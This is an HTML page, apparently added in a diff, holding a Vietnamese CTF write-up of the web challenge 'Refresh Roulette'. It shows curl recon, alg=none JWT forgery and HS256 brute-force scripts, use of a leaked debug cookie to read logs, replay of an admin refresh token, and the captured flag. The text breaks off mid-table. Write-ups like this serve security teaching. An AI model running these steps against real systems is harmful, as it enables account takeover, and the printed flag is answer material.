@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hướng dẫn từng bước — Refresh Roulette (Web CTF)</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --fg:#e6edf3; --mut:#8b949e;
+          --acc:#58a6ff; --ok:#3fb950; --warn:#d29922; --bad:#f85149; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+         font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; line-height:1.7; }
+  .wrap { max-width:940px; margin:0 auto; padding:32px 20px 90px; }
+  header.hero { border:1px solid var(--border); border-radius:12px; background:linear-gradient(135deg,#161b22,#1a2332);
+                 padding:28px 32px; margin-bottom:28px; }
+  header.hero h1 { margin:0 0 6px; font-size:1.7rem; }
+  header.hero .sub { color:var(--mut); }
+  .flag-box { margin-top:16px; border:1px solid var(--ok); border-radius:10px; background:#12261a; padding:14px 18px; }
+  .flag-box code { color:var(--ok); font-size:1.15rem; font-weight:700; }
+  h2 { color:var(--acc); border-bottom:1px solid var(--border); padding-bottom:8px; margin-top:52px; }
+  h3 { color:var(--fg); margin-top:32px; }
+  h4 { color:var(--acc); margin-top:22px; }
+  .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:18px 22px; margin:16px 0; }
+  code { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.88em;
+         background:#1c2128; border:1px solid var(--border); border-radius:5px; padding:2px 6px; color:#a5d6ff; }
+  pre { background:#0d1117; border:1px solid var(--border); border-radius:10px; padding:16px; overflow-x:auto;
+        color:#c9d1d9; line-height:1.6; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.87em; }
+  pre code { background:none; border:none; padding:0; color:inherit; }
+  .cm { color:#7ee787; }      /* comment trong code */
+  .kw { color:#ff7b72; }      /* keyword */
+  .st { color:#a5d6ff; }     /* string */
+  .fn { color:#d2a8ff; }     /* function */
+  table { border-collapse:collapse; width:100%; margin:16px 0; font-size:.92em; }
+  th,td { border:1px solid var(--border); padding:9px 12px; text-align:left; vertical-align:top; }
+  th { background:#1c2128; }
+  .tag { display:inline-block; font-size:.75rem; font-weight:700; border-radius:20px; padding:2px 10px; margin-right:6px; }
+  .tag.ok { background:#12261a; color:var(--ok); border:1px solid var(--ok); }
+  .tag.bad { background:#2d1214; color:var(--bad); border:1px solid var(--bad); }
+  .tag.warn { background:#2a2110; color:var(--warn); border:1px solid var(--warn); }
+  .note { border-left:4px solid var(--warn); background:#211d12; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .tip { border-left:4px solid var(--ok); background:#12261a55; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .verify { border-left:4px solid var(--acc); background:#0d1a2b; padding:12px 16px; border-radius:0 8px 8px 0; margin:16px 0; }
+  .verify b:first-child { color:var(--acc); }
+  .muted { color:var(--mut); }
+  ol.steps > li, ul.dash > li { margin-bottom:8px; }
+  .toc a { color:var(--acc); text-decoration:none; }
+  .toc a:hover { text-decoration:underline; }
+  .spring { border:1px solid #6e7681; border-radius:10px; margin:16px 0; overflow:hidden; }
+  .spring .hd { background:#12324a; padding:8px 16px; font-weight:700; font-size:.9em; color:#79c0ff; }
+  .spring .bd { padding:4px 16px 14px; background:#0d1117; }
+  .spring.bad-ex .hd { background:#3d1d22; color:#ffa198; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<!-- ================= HERO ================= -->
+<header class="hero">
+  <h1>🎡 Refresh Roulette — Hướng dẫn từng bước cho người mới</h1>
+  <div class="sub">Challenge Web · Norland Vendor Access Portal · <span class="muted">target: <code>154.57.164.71:36575</code></span></div>
+  <div class="flag-box">
+    🏁 Flag (đã lấy được, chưa nộp — bạn tự submit):<br>
+    <code>HTB{R3fr3sh_T0k3ns_Must_R0t4t3}</code>
+  </div>
+  <div class="card toc" style="margin-top:16px">
+    <b>Mục lục:</b><br>
+    <a href="#p0">Phần 0 — Kiến thức nền (JWT, token, cookie, access log)</a> ·
+    <a href="#p1">Phần 1 — Recon ứng dụng</a> ·
+    <a href="#p2">Phần 2 — Các hướng tấn công trực diện (đều thất bại)</a> ·
+    <a href="#p3">Phần 3 — Đột phá qua /logs</a> ·
+    <a href="#p4">Phần 4 — Kết liễu</a> ·
+    <a href="#p5">Phần 5 — Root cause qua góc nhìn Spring Boot</a> ·
+    <a href="#p6">Phần 6 — Bài học & checklist</a>
+  </div>
+</header>
+
+<p class="muted">Bài viết giả định bạn là lập trình viên web (mình viết các ví dụ tương đồng bằng <b>Java Spring Boot</b>) nhưng chưa chuyên sâu về bảo mật. Mỗi bước đều có mục <b>✔ Cách verify</b> — hãy làm theo đúng thứ tự, verify xong bước nào mới sang bước tiếp.</p>
+
+<!-- ================= PHẦN 0 ================= -->
+<h2 id="p0">Phần 0 — Kiến thức nền cần có trước khi bắt đầu</h2>
+
+<h3>0.1 — JWT là gì?</h3>
+<div class="card">
+<p>JWT (JSON Web Token) là một chuỗi gồm <b>3 phần nối nhau bằng dấu chấm</b>:</p>
+<pre>xxxxx.yyyyy.zzzzz
+↑header    ↑payload   ↑chữ ký</pre>
+<p>Cả header và payload chỉ là <b>JSON được mã hóa Base64URL</b> — <b>không phải mã hóa bí mật</b>, ai cũng decode ngược được. Phần duy nhất đảm bảo tính toàn vẹn là <b>chữ ký</b> (phần 3): server tạo bằng cách lấy <code>HMAC-SHA256(header.payload, secret)</code>. Không biết <code>secret</code> thì không thể sửa payload mà chữ ký vẫn hợp lệ.</p>
+<div class="verify">
+<b>✔ Tự verify bằng tay:</b> lấy phần giữa của bất kỳ JWT nào, bỏ qua chữ ký, decode:<br><br>
+<code>echo "eyJzdWIiOiIxMjM0NTY3ODkwIn0" | base64 -d 2&gt;/dev/null; echo</code><br><br>
+(Base64URL thiếu padding nên có thể cần thêm <code>=</code> vào cuối. Hoặc dùng <code>python3 -c "import base64;print(base64.urlsafe_b64decode('...'))"</code>.)
+</div>
+<div class="spring">
+  <div class="hd">☕ Tương đồng Spring Boot</div>
+  <div class="bd"><p style="margin-top:10px">Trong Spring Boot bạn thường tạo JWT bằng thư viện <code>jjwt</code> hoặc <code>java-jwt</code> (Auth0):</p>
+<pre><span class="kw">String</span> token = Jwts.builder()
+    .setSubject(user.getId())
+    .claim(<span class="st">"email"</span>, user.getEmail())
+    .claim(<span class="st">"role"</span>, user.getRole())
+    .signWith(Keys.hmacShaKeyFor(secret))   <span class="cm">// HS256 — secret là 1 chuỗi byte</span>
+    .compact();</pre>
+<p class="muted">Challenge này dùng đúng kiến trúc đó, nhưng cấu hình yếu ở chỗ khác — ta sẽ thấy.</p></div>
+</div>
+</div>
+
+<h3>0.2 — Access token vs Refresh token</h3>
+<div class="card">
+<table>
+<tr><th></th><th>Access token</th><th>Refresh token</th></tr>
+<tr><td><b>Thời gian sống</b></td><td>Rất ngắn (challenge này: <b>2 phút</b>)</td><td>Dài (challenge này: <b>24 giờ</b>)</td></tr>
+<tr><td><b>Công dụng</b></td><td>Gắn vào mọi request API (<code>Authorization: Bearer ...</code>)</td><td>Chỉ dùng 1 lần ở endpoint <code>/auth/refresh</code> để xin access token mới</td></tr>
+<tr><td><b>Bảo vệ</b></td><td>Nhẹ (sống ngắn, lộ cũng hết hạn nhanh)</td><td><b>Phải bảo vệ cực kỹ</b> — lộ = kẻ xấu đóng vai bạn cả ngày</td></tr>
+</table>
+<p>Luồng chuẩn: login → nhận cả 2 → access hết hạn → gọi refresh → nhận access mới (và refresh token <b>mới</b> nếu hệ thống có <i>rotation</i>).</p>
+<div class="spring">
+  <div class="hd">☕ Tương đồng Spring Boot</div>
+  <div class="bd"><p style="margin-top:10px">Khi bạn thấy code kiểu này là biết ngay hệ thống có refresh token:</p>
+<pre><span class="cm">// Client tự gọi khi access token hết hạn</span>
+<span class="fn">@GetMapping</span>(<span class="st">"/auth/refresh"</span>)
+<span class="kw">public</span> TokenResponse refresh(<span class="fn">@RequestParam</span> <span class="kw">String</span> refreshToken) { ... }</pre>
+<p class="muted">⚠️ Chú ý <code>@RequestParam</code> — tham số đi qua <b>URL query</b>. Chi tiết lỗi này ở Phần 5.</p></div>
+</div>
+</div>
+
+<h3>0.3 — Cookie và "debug cookie"</h3>
+<div class="card">
+<p>Cookie là dữ liệu trình duyệt tự gửi kèm mọi request tới domain. Server có thể dùng cookie để <b>phân quyền</b>. Nếu developer để lại một cookie <i>cứng</i> kiểu "set cookie này là được vào trang debug", đó là cửa hậu (backdoor).</p>
+<p>Hai thuộc tính quan trọng thường gặp:</p>
+<ul class="dash">
+<li><code>HttpOnly</code>: JS không đọc được (chống XSS đánh cắp cookie) — token trong challenge này <b>không</b> set HttpOnly (để JS frontend đọc được), đó cũng là một điểm yếu.</li>
+<li><code>SameSite=Lax</code>: trình duyệt không gửi cookie khi request đến từ site khác (chống CSRF một phần).</li>
+</ul>
+</div>
+
+<h3>0.4 — Access log là gì và tại sao nó nguy hiểm?</h3>
+<div class="card">
+<p>Mọi web server đều ghi lại từng request: thời gian, method, <b>URL đầy đủ kèm query string</b>, status code. Trong Spring Boot/Tomcat bạn có thể bật bằng <code>server.tomcat.accesslog.enabled=true</code>, hoặc một <code>Filter</code> ghi log, hoặc AOP log mọi request.</p>
+<div class="note">⚠️ <b>Hệ quả cốt lõi của bài này:</b> nếu credential đi qua <b>URL query</b> (<code>?refresh_token=eyJ...</code>), nó sẽ nằm lì trong log dưới dạng <b>plaintext</b>. Ai đọc được log = ai đó có credential. Đây là lý do chuẩn bảo mật cấm đặt secret lên URL.</div>
+</div>
+
+<h3>0.5 — Cờ curl dùng xuyên suốt bài</h3>
+<div class="card">
+<table>
+<tr><th>Cờ</th><th>Ý nghĩa</th><th>Tại sao dùng ở đây</th></tr>
+<tr><td><code>-s</code></td><td>silent — tắt progress bar</td><td>Không muốn dòng <code>Trying…</code> lẫn vào output</td></tr>
+<tr><td><code>-i</code></td><td>in kèm HTTP headers</td><td><b>Bắt buộc</b> — cần thấy status code (200/403/404) và header Set-Cookie</td></tr>
+<tr><td><code>-X POST</code></td><td>chọn HTTP method</td><td>Server chỉ nhận POST ở /auth/register, /auth/login</td></tr>
+<tr><td><code>-H</code></td><td>thêm request header</td><td>Gửi <code>Content-Type: application/json</code>, <code>Authorization</code>, <code>Cookie</code></td></tr>
+<tr><td><code>-d '...'</code></td><td>request body</td><td>Payload JSON</td></tr>
+<tr><td><code>-w "%{http_code}"</code></td><td>in status code thuần</td><td>Tiện cho vòng lặp dò đường dẫn</td></tr>
+<tr><td><code>-o /dev/null</code></td><td>bỏ body</td><td>Khi chỉ quan tâm status code</td></tr>
+<tr><td><code>--max-time 15</code></td><td>timeout 15 giây</td><td>Tránh lệnh treo khi mạng chập chờn</td></tr>
+</table>
+</div>
+
+<!-- ================= PHẦN 1 ================= -->
+<h2 id="p1">Phần 1 — Recon: lần theo dấu vết "hoạt động chính thức"</h2>
+<p class="muted">Triết lý: đề bài nói "traces of official activity linger" (dấu vết hoạt động chính thức còn sót lại) — nghĩa là ai đó để quên thứ gì đó trong production. Nhiệm vụ đầu tiên không phải tấn công mà là <b>thu thập mọi thứ server vô tình lộ ra</b>.</p>
+
+<h3>Bước 1.1 — Xem trang chủ</h3>
+<pre><span class="cm"># Xem cả header lẫn body</span>
+curl -s -i --max-time 15 http://154.57.164.71:36575/</pre>
+<p>Đọc HTML ta thấy: đây là "Norland Vendor Access Portal", có các trang <code>/register</code>, <code>/login</code>, <code>/profile</code>, và một chi tiết thú vị:</p>
+<pre>&lt;meta name=<span class="st">"asset-manifest"</span> content=<span class="st">"/static/manifest.json"</span> /&gt;
+&lt;script&gt; window.__ASSET_MANIFEST__ = <span class="st">"/static/manifest.json"</span>; &lt;/script&gt;</pre>
+<div class="verify"><b>✔ Cách verify:</b> chạy lệnh trên, kiểm tra 3 điểm — (1) status line trả <code>HTTP/1.1 200 OK</code>; (2) trong body thấy các href <code>/register</code>, <code>/login</code>; (3) thấy đoạn script tham chiếu <code>manifest.json</code>. Nếu thiếu (1) thì target chưa sẵn sàng hoặc sai IP/port.</div>
+
+<h3>Bước 1.2 — Lấy manifest.json, tải 2 bundle JS</h3>
+<pre><span class="cm"># 1. Xem manifest — file "bản đồ" tài nguyên JS của SPA</span>
+curl -s --max-time 15 http://154.57.164.71:36575/static/manifest.json
+
+<span class="cm"># 2. Tải cả 2 bundle về máy để đọc</span>
+mkdir -p refresh_roulette &amp;&amp; cd refresh_roulette
+curl -s --max-time 15 -o main.js http://154.57.164.71:36575/static/auto/main.e16e0b09a12cb686c8c3.js
+curl -s --max-time 15 -o dev.js  http://154.57.164.71:36575/static/auto/dev.c2265f2b5f7fbf0f9140.js
+wc -c main.js dev.js</pre>
+<div class="verify"><b>✔ Cách verify:</b> lệnh 1 phải trả JSON đúng dạng <code>{"main.js": "/static/auto/….js", "dev.js": "/static/auto/….js"}</code>. Lệnh 2: cả 2 file tải về có kích thước &gt; 0 byte. Nếu 404 → tên file trong manifest đã thay đổi, phải dùng đúng tên mới từ bước 1.</div>
+<div class="note">📌 <b>Manh mối đầu tiên:</b> production phục vụ một bundle tên <code>dev.js</code>. Với người làm web, đây là mùi — bundle dev thường chứa endpoint debug, flag giả, hoặc khóa thử nghiệm không được build ra production.</div>
+
+<h3>Bước 1.3 — Đọc main.js: lật tẩy toàn bộ API</h3>
+<p><code>main.js</code> bị minify. Không cần đẹp, chỉ cần đọc kỹ các chuỗi URL nằm trong các lời gọi <code>fetch(...)</code>. Đọc xong ta vẽ được bản đồ API:</p>
+<table>
+<tr><th>Endpoint</th><th>Method &amp; tham số</th><th>Phát hiện quan trọng</th></tr>
+<tr><td><code>/auth/register</code></td><td>POST body JSON <code>{email, password}</code></td><td>Trả về cả access + refresh token</td></tr>
+<tr><td><code>/auth/login</code></td><td>POST body JSON <code>{email, password}</code></td><td>Như trên</td></tr>
+<tr><td><code>/auth/refresh</code></td><td><b>GET, token nằm trên URL query</b> <code>?refresh_token=…</code></td><td>⚠️ <b>Lỗ hổng cốt lõi #1</b> — xem Phần 5</td></tr>
+<tr><td><code>/profile/data</code></td><td>GET + header <code>Authorization: Bearer &lt;access&gt;</code></td><td>Trả <code>{email, role, flag?}</code> — flag chỉ có khi <code>role=admin</code></td></tr>
+</table>
+<div class="verify"><b>✔ Cách verify:</b> mở file main.js, tìm chuỗi <code>fetch(</code> (vd: <code>grep -o 'fetch([^)]*)' main.js</code> hoặc mở bằng editor search). Liệt kê đúng 4 endpoint trên là đủ — bất kỳ endpoint nào khác trong code cũng nên ghi lại để thử sau.</div>
+
+<h3>Bước 1.4 — Đọc dev.js: tìm thấy "chìa khóa cửa hậu"</h3>
+<p><code>dev.js</code> chỉ ~300 byte, đọc nguyên văn:</p>
+<pre>(() =&gt; {
+  <span class="kw">const</span> o = <span class="st">"ops_diag"</span>, s = <span class="st">"testing_cookie_for_debug_purposes"</span>;
+  <span class="kw">function</span> <span class="fn">i</span>() { <span class="kw">return</span> document.cookie = `${o}=${s}; Path=/; SameSite=Lax`, `${o}=${s}` }
+  window.__diagnostics = { setDiagnosticsCookie: i, ..., DEBUG_COOKIE_NAME: o, DEBUG_COOKIE_KEY: s }
+})();</pre>
+<p>Nghĩa là: có một cookie debug tên <code>ops_diag</code> giá trị <code>testing_cookie_for_debug_purposes</code>. Server production vẫn tôn trọng cookie này.</p>
+<div class="verify"><b>✔ Cách verify:</b> đây là phân tích tĩnh (đọc code), không cần gọi server. Nhưng hãy ghi chú lại 2 giá trị <code>ops_diag</code> / <code>testing_cookie_for_debug_purposes</code> — sẽ dùng ở Phần 3. Nếu file dev.js trống hoặc 404, tải lại từ manifest (bước 1.2).</div>
+
+<h3>Bước 1.5 — Dò đường dẫn có chọn lọc: phát hiện /logs</h3>
+<p>App <b>không hề</b> liên kết tới <code>/logs</code> ở bất kỳ đâu — không có manh mối trực tiếp. Nhưng ta có <b>hai gợi ý gián tiếp</b> để chọn từ khóa thay vì dò mù:</p>
+<ul class="dash">
+  <li><b>Đề bài:</b> "traces of official activity linger in Norland's systems" — <i>dấu vết hoạt động còn sót lại</i>. Dấu vết của một web app thì lưu ở đâu? Access log. → ưu tiên thử <code>logs</code>, <code>log</code>, <code>diagnostics</code>.</li>
+  <li><b>Cookie ở bước 1.4:</b> tên <code>ops_diag</code> = <i>operations diagnostics</i> — dev tạo cookie này để mở <i>một chỗ nào đó phục vụ chẩn đoán</i>. Giả thuyết "có trang diagnostics/logs bị khóa, cookie này là chìa" rất tự nhiên.</li>
+</ul>
+<p>Phần còn lại của danh sách (<code>debug</code>, <code>admin</code>, <code>status</code>, ...) là các path kinh điển trong web CTF — cho vào cùng vòng lặp cho nhanh; chỉ cần một cái khác 404 là có mỏ vàng:</p>
+<pre><span class="cm"># Vòng lặp dò path — ưu tiên từ khóa gợi ý bởi đề bài + cookie ops_diag</span>
+<span class="kw">for</span> p <span class="kw">in</span> logs log debug admin api status health backup .env config diagnostics report; <span class="kw">do</span>
+  code=$(curl -s -o /dev/null -w <span class="st">"%{http_code}"</span> --max-time 10 <span class="st">"http://154.57.164.71:36575/<span class="fn">$p</span>"</span>)
+  echo <span class="st">"$p -&gt; $code"</span>
+<span class="kw">done</span></pre>
+<p>Kết quả thực tế:</p>
+<pre>logs -&gt; 403      <span class="cm">← TỒN TẠI nhưng bị chặn quyền!</span>
+log -&gt; 404
+debug -&gt; 404
+admin -&gt; 404
+...</pre>
+<div class="verify"><b>✔ Cách verify &amp; cách đọc kết quả:</b> phân biệt 2 trường hợp — <code>404</code> (server không có route này, framework trả "Route GET:/xxx not found") vs <code>403</code> (route <b>có tồn tại</b>, code đã chạy tới bước kiểm quyền và từ chối). Chỉ <code>logs</code> trả 403 → đây là endpoint thật, bị khóa. Đây chính là nơi "dấu vết" được lưu.</div>
+<div class="spring">
+  <div class="hd bad-ex">☕ Tương đồng Spring Boot — kiểu code tạo ra /logs 403</div>
+  <div class="bd">
+<pre><span class="fn">@GetMapping</span>(<span class="st">"/logs"</span>)
+<span class="kw">public</span> Map&lt;String, Object&gt; logs(<span class="fn">@CookieValue</span>(value = <span class="st">"ops_diag"</span>, required = <span class="kw">false</span>) String diag) {
+    <span class="kw">if</span> (!<span class="st">"testing_cookie_for_debug_purposes"</span>.equals(diag)) {
+        <span class="kw">throw new</span> ResponseStatusException(HttpStatus.FORBIDDEN);   <span class="cm">// ← 403</span>
+    }
+    <span class="kw">return</span> Map.of(<span class="st">"logs"</span>, readAccessLog());
+}</pre>
+<p class="muted">Kiểm soát truy cập bằng <b>cookie cứng trong code</b> — và cookie đó lại bị lộ trong bundle dev.js. Hai lỗi nhân lên nhau.</p>
+  </div>
+</div>
+
+<!-- ================= PHẦN 2 ================= -->
+<h2 id="p2">Phần 2 — Các hướng tấn công trực diện (đều thất bại, và cách verify từng cái)</h2>
+<p class="muted">Trước khi đi đường vòng, ta phải chứng minh đường tắt không đi được. Mỗi hướng dưới đây đều có kết quả verify rõ ràng — đọc kỹ để hiểu vì sao cuối cùng phải đi ăn cắp token.</p>
+
+<h3>Bước 2.1 — Đăng ký tài khoản, giải mã token của chính mình</h3>
+<pre><span class="cm"># Đăng ký — server trả ngay cặp token</span>
+curl -s -i -X POST http://154.57.164.71:36575/auth/register \
+  -H <span class="st">'Content-Type: application/json'</span> \
+  -d <span class="st">'{"email":"hoang.test.2026@example.com","password":"Test1234!x"}'</span></pre>
+<p>Response 200, body là JSON chứa <code>access_token</code> và <code>refresh_token</code>, đều dạng JWT. Decode phần giữa của access token (cắt chuỗi giữa 2 dấu chấm, base64-decode):</p>
+<pre>{
+  <span class="st">"sub"</span>: <span class="st">"0d0628fb-5d16-4fc4-88c2-e96934e332e3"</span>,   <span class="cm">← UUID user</span>
+  <span class="st">"email"</span>: <span class="st">"hoang.test.2026@example.com"</span>,
+  <span class="st">"role"</span>: <span class="st">"user"</span>,                        <span class="cm">← quyền thường</span>
+  <span class="st">"type"</span>: <span class="st">"access"</span>,
+  <span class="st">"iat"</span>: 1792680511, <span class="st">"exp"</span>: 1792680631   <span class="cm">← exp - iat = 120 giây</span>
+}</pre>
+<div class="verify"><b>✔ Cách verify:</b> (1) status phải là 200 và JSON có đủ 2 trường token (nếu trùng email đã đăng ký thì đổi email khác); (2) tự decode payload bằng lệnh ở mục 0.1, xác nhận <code>role=user</code> và <code>type=access</code>; (3) kiểm tra <code>exp - iat</code> bằng cách trừ 2 số — ra 120 → access token sống 2 phút. Mọi con số trong write-up phải tự verify lại được, không tin lời mô tả.</div>
+
+<h3>Bước 2.2 — Gọi /profile/data với token thường</h3>
+<pre>curl -s -i -H <span class="st">"Authorization: Bearer &lt;ACCESS_TOKEN&gt;"</span> \
+  http://154.57.164.71:36575/profile/data</pre>
+<p>Kết quả:</p>
+<pre>{<span class="st">"email"</span>:<span class="st">"hoang.test.2026@example.com"</span>,<span class="st">"role"</span>:<span class="st">"user"</span>,<span class="st">"access_token"</span>:null}</pre>
+<div class="verify"><b>✔ Cách verify:</b> thấy <code>role=user</code> và <b>không có trường <code>flag</code></b>. Đối chiếu với main.js: code chỉ push dòng <code>Flag:</code> khi <code>d.flag</code> tồn tại → server quyết định gửi flag hay không dựa trên role trong token. Mục tiêu giờ rõ: cần một token <code>role=admin</code>.</div>
+
+<h3>Bước 2.3 — Thử forge token bằng alg=none ❌</h3>
+<p>JWT hỗ trợ thuật toán <code>none</code> (không chữ ký). Nếu server tin tưởng header mà không verify, ta tự ký token admin giả:</p>
+<pre><span class="cm"># Tạo token: header {"alg":"none"}, payload role=admin, chữ ký rỗng</span>
+python3 - &lt;&lt;<span class="st">'EOF'</span>
+<span class="kw">import</span> base64, json, urllib.request
+b64 = <span class="kw">lambda</span> d: base64.urlsafe_b64encode(d).decode().rstrip(<span class="st">'='</span>)
+hdr = b64(json.dumps({<span class="st">"alg"</span>:<span class="st">"none"</span>,<span class="st">"typ"</span>:<span class="st">"JWT"</span>}).encode())
+pld = b64(json.dumps({<span class="st">"sub"</span>:<span class="st">"0d0628fb-..."</span>,<span class="st">"email"</span>:<span class="st">"..."</span>,<span class="st">"role"</span>:<span class="st">"admin"</span>,<span class="st">"type"</span>:<span class="st">"access"</span>,<span class="st">"iat"</span>:1792680511,<span class="st">"exp"</span>:1992680631}).encode())
+tok = f<span class="st">"{hdr}.{pld}."</span>
+req = urllib.request.Request(<span class="st">"http://154.57.164.71:36575/profile/data"</span>,
+    headers={<span class="st">"Authorization"</span>: f<span class="st">"Bearer {tok}"</span>})
+<span class="kw">try</span>:
+    print(urllib.request.urlopen(req, timeout=15).read().decode())
+<span class="kw">except</span> urllib.error.HTTPError <span class="kw">as</span> e:
+    print(<span class="st">"HTTP"</span>, e.code, e.read().decode()[:200])
+EOF</pre>
+<div class="verify"><b>✔ Cách verify kết quả thất bại:</b> server trả <code>HTTP 401 {"error":"jwt signature is required"}</code>. → Hệ thống bắt buộc có chữ ký, không đánh lừa bằng alg=none được. Ghi nhận: hướng này đóng.</div>
+
+<h3>Bước 2.4 — Brute-force secret HS256 ❌</h3>
+<p>Nếu secret là chuỗi yếu/guess được, ta có thể tự ký token admin hợp lệ. Cách kiểm tra: với mỗi ứng viên <code>key</code>, tính <code>HMAC-SHA256(header.payload, key)</code> và so với chữ ký trong token thật:</p>
+<pre><span class="cm"># Tải wordlist secret JWT công khai (wallarm/jwt-secrets)</span>
+curl -s -o jwt.secrets.list \
+  https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
+
+<span class="cm"># Brute-force — token thật lấy từ bước 2.1</span>
+python3 - &lt;&lt;<span class="st">'EOF'</span>
+<span class="kw">import</span> base64, hmac, hashlib
+token = <span class="st">"&lt;ACCESS_TOKEN&gt;"</span>
+msg, sig = token.rsplit(<span class="st">'.'</span>, 1)
+expected = base64.urlsafe_b64decode(sig + <span class="st">'='</span> * (-len(sig) % 4))
+<span class="kw">for</span> line <span class="kw">in</span> open(<span class="st">'jwt.secrets.list'</span>, errors=<span class="st">'ignore'</span>):
+    key = line.strip()
+    <span class="kw">if not</span> key <span class="kw">or</span> key.startswith(<span class="st">'#'</span>): <span class="kw">continue</span>
+    mac = hmac.new(key.encode(), msg.encode(), hashlib.sha256).digest()
+    <span class="kw">if</span> hmac.compare_digest(mac, expected):
+        print(<span class="st">"[+] FOUND:"</span>, key); <span class="kw">break</span>
+<span class="kw">else</span>:
+    print(<span class="st">"[-] Không tìm thấy"</span>)
+EOF</pre>
+<div class="verify"><b>✔ Cách verify kết quả thất bại:</b> chạy xuất <code>[-] Không tìm thấy</code> sau ~104.000 keys. → Secret là chuỗi tự tạo, không crack nhanh được (với HS256 đủ dài thì brute-force không khả thi). Ghi nhận: hướng forge token đóng hoàn toàn. Phải tìm <b>token thật của admin</b> — đề bài gợi ý "connect the scraps".</div>
+
+<!-- ================= PHẦN 3 ================= -->
+<h2 id="p3">Phần 3 — Đột phá: cookie debug mở cửa /logs, lấy token admin</h2>
+
+<h3>Bước 3.1 — Mở /logs bằng cookie ops_diag</h3>
+<pre>curl -s -i -H <span class="st">"Cookie: ops_diag=testing_cookie_for_debug_purposes"</span> \
+  http://154.57.164.71:36575/logs</pre>
+<div class="verify"><b>✔ Cách verify thành công:</b> status chuyển từ 403 → <b>200</b>, body là JSON dạng <code>{"logs": [ "...dòng log 1...", "...dòng log 2...", ... ]}</code>. Nếu vẫn 403 → sai tên/giá trị cookie (quay lại bước 1.4 đọc lại dev.js).</div>
+<p>Nếu so sánh 2 request (không cookie → 403, có cookie → 200) ta kết luận chắc chắn: <b>server kiểm tra đúng cookie này để cấp quyền đọc log</b>. Đây là lỗ hổng cốt lõi #2.</p>
+
+<h3>Bước 3.2 — Săn credential trong log</h3>
+<p>Log gồm nhiều dòng dạng:</p>
+<pre>[2026-10-22T14:32:34.617Z] INFO request completed method=GET url=/auth/refresh?refresh_token=eyJhbGciOi... <b>&lt;JWT DÀI&gt;</b> status=</pre>
+<p>Đây chính là hệ quả của lỗ hổng #1 (token trên URL query): admin đã từng làm mới token, và refresh token của họ bị ghi lại <b>nguyên văn</b> trong log. Sao chép chuỗi JWT đó, decode phần giữa:</p>
+<pre>{
+  <span class="st">"sub"</span>: <span class="st">"e369326c-cb6d-4a04-9df4-7585c16d90b6"</span>,
+  <span class="st">"email"</span>: <span class="st">"admin@corp.htb"</span>,      <span class="cm">← tài khoản admin!</span>
+  <span class="st">"role"</span>: <span class="st">"admin"</span>,               <span class="cm">← đúng thứ ta cần</span>
+  <span class="st">"type"</span>: <span class="st">"refresh"</span>,
+  <span class="st">"iat"</span>: 1792679554,
+  <span class="st">"exp"</span>: 1792765954           <span class="cm">← iat + 86400 = còn hạn tới hết ngày mai</span>
+}</pre>
+<div class="verify"><b>✔ Cách verify từng mảnh:</b><br>
+1. Decode payload bằng lệnh base64 ở mục 0.1 → xác nhận <code>role=admin</code>, <code>type=refresh</code>.<br>
+2. Kiểm tra hạn sống: lấy <code>exp - iat = 86400</code> giây = 24h; đối chiếu thời điểm hiện tại (lệnh <code>date +%s</code>) &lt; exp → token còn dùng được.<br>
+3. Kiểm tra <b>thật</b> hay <b>giả</b>: gọi luôn endpoint refresh ở bước dưới — nếu server trả access token mới thì token thật 100% (server đã verify chữ ký thành công).</div>
+<div class="note">⚠️ Nếu bạn tự deploy lại challenge, mỗi lần chạy <code>db.migrate()</code> sẽ xóa dữ liệu cũ và log mới sẽ khác — token trong log của phiên bạn đang chơi mới có giá trị. Luôn dùng token từ log của phiên hiện tại.</div>
+
+<!-- ================= PHẦN 4 ================= -->
+<h2 id="p4">Phần 4 — Kết liễu: đổi token admin, đọc flag</h2>
+
+<h3>Bước 4.1 — Đổi admin refresh token lấy admin access token</h3>
+<pre>curl -s -i <span class="st">"http://154.57.164.71:36575/auth/refresh?refresh_token=&lt;ADMIN_REFRESH_TOKEN&gt;"</span></pre>
+<div class="verify"><b>✔ Cách verify:</b> status 200, body <code>{"access_token":"eyJ..."}</code>. Decode payload của access token mới — phải thấy <code>"role":"admin"</code> và <code>"type":"access"</code>. Đây cũng là bằng chứng token log là thật (bước 3.2 mục 3).</div>
+
+<h3>Bước 4.2 — Gọi /profile/data với admin access token</h3>
+<pre>curl -s -i -H <span class="st">"Authorization: Bearer &lt;ADMIN_ACCESS_TOKEN&gt;"</span> \
+  http://154.57.164.71:36575/profile/data</pre>
+<p>Response:</p>
+<pre>{
+  <span class="st">"email"</span>: <span class="st">"admin@corp.htb"</span>,
+  <span class="st">"role"</span>: <span class="st">"admin"</span>,
+  <span class="st">"access_token"</span>: null,
+  <span class="st">"flag"</span>: <span class="st">"HTB{R3fr3sh_T0k3ns_Must_R0t4t3}"</span>   <span class="cm">← 🏁</span>
+}</pre>
+<div class="verify"><b>✔ Cách verify:</b> (1) so sánh với bước 2.2 — lần này có thêm trường <code>flag</code>, đúng như main.js dự đoán; (2) flag khớp định dạng <code>HTB{...}</code>; (3) cuối cùng: tự submit ở portal challenge — chỉ khi portal xác nhận accepted mới tính là xong.</div>
+
+<h3>Bảng tổng kết chuỗi tấn công</h3>
+<table>
+<tr><th>#</th><th>Hành động</th><th>Dựa vào đâu</th><th>Verify bằng</th></tr>
+<tr><td>1</td><td>Tải manifest.json → 2 bundle JS</td><td>Thẻ meta asset-manifest trong HTML</td><td>Status 200 + JSON hợp lệ</td></tr>
+<tr><td>2</td><td>Đọc main.js → bản đồ 4 endpoint</td><td>Chuỗi fetch() trong bundle</td><td>grep tìm đủ 4 endpoint</td></tr>
+<tr><td>3</td><td>Đọc dev.js → cookie ops_diag</td><td>Bundle dev bị lộ production</td><td>Đọc tĩnh, ghi nhớ 2 giá trị</td></tr>
